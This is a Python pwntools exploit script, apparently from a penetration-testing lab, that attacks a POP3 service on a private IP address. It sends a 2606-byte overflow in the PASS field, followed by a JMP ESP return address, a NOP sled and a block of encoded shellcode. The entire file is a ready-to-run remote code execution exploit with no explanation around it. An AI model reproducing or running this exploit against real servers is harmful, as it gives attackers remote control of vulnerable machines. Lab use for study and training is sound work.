#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 192.168.34.144 --port 110
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or '192.168.34.144'
port = int(args.PORT or 110)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    return remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

jmpesp = '\x8f\x35\x4a\x5f'

shellcode =  ""
shellcode += "\xd9\xc0\xba\x14\xf9\xdc\xcf\xd9\x74\x24\xf4\x5b\x33"
shellcode += "\xc9\xb1\x52\x83\xc3\x04\x31\x53\x13\x03\x47\xea\x3e"
shellcode += "\x3a\x9b\xe4\x3d\xc5\x63\xf5\x21\x4f\x86\xc4\x61\x2b"
shellcode += "\xc3\x77\x52\x3f\x81\x7b\x19\x6d\x31\x0f\x6f\xba\x36"
shellcode += "\xb8\xda\x9c\x79\x39\x76\xdc\x18\xb9\x85\x31\xfa\x80"
shellcode += "\x45\x44\xfb\xc5\xb8\xa5\xa9\x9e\xb7\x18\x5d\xaa\x82"
shellcode += "\xa0\xd6\xe0\x03\xa1\x0b\xb0\x22\x80\x9a\xca\x7c\x02"
shellcode += "\x1d\x1e\xf5\x0b\x05\x43\x30\xc5\xbe\xb7\xce\xd4\x16"
shellcode += "\x86\x2f\x7a\x57\x26\xc2\x82\x90\x81\x3d\xf1\xe8\xf1"
shellcode += "\xc0\x02\x2f\x8b\x1e\x86\xab\x2b\xd4\x30\x17\xcd\x39"
shellcode += "\xa6\xdc\xc1\xf6\xac\xba\xc5\x09\x60\xb1\xf2\x82\x87"
shellcode += "\x15\x73\xd0\xa3\xb1\xdf\x82\xca\xe0\x85\x65\xf2\xf2"
shellcode += "\x65\xd9\x56\x79\x8b\x0e\xeb\x20\xc4\xe3\xc6\xda\x14"
shellcode += "\x6c\x50\xa9\x26\x33\xca\x25\x0b\xbc\xd4\xb2\x6c\x97"
shellcode += "\xa1\x2c\x93\x18\xd2\x65\x50\x4c\x82\x1d\x71\xed\x49"
shellcode += "\xdd\x7e\x38\xdd\x8d\xd0\x93\x9e\x7d\x91\x43\x77\x97"
shellcode += "\x1e\xbb\x67\x98\xf4\xd4\x02\x63\x9f\x1a\x7a\x49\xd5"
shellcode += "\xf3\x79\x8d\xce\x0c\xf7\x6b\x7a\x03\x51\x24\x13\xba"
shellcode += "\xf8\xbe\x82\x43\xd7\xbb\x85\xc8\xd4\x3c\x4b\x39\x90"
shellcode += "\x2e\x3c\xc9\xef\x0c\xeb\xd6\xc5\x38\x77\x44\x82\xb8"
shellcode += "\xfe\x75\x1d\xef\x57\x4b\x54\x65\x4a\xf2\xce\x9b\x97"
shellcode += "\x62\x28\x1f\x4c\x57\xb7\x9e\x01\xe3\x93\xb0\xdf\xec"
shellcode += "\x9f\xe4\x8f\xba\x49\x52\x76\x15\x38\x0c\x20\xca\x92"
shellcode += "\xd8\xb5\x20\x25\x9e\xb9\x6c\xd3\x7e\x0b\xd9\xa2\x81"
shellcode += "\xa4\x8d\x22\xfa\xd8\x2d\xcc\xd1\x58\x5d\x87\x7b\xc8"
shellcode += "\xf6\x4e\xee\x48\x9b\x70\xc5\x8f\xa2\xf2\xef\x6f\x51"
shellcode += "\xea\x9a\x6a\x1d\xac\x77\x07\x0e\x59\x77\xb4\x2f\x48"

exploit = 'A' * 2606 + jmpesp + '\x90' * 32 + shellcode

info(io.recv(4096))
io.sendline('USER jack')
info(io.recv(4096))
io.sendline(f'PASS {exploit}')
info(io.recv(4096))
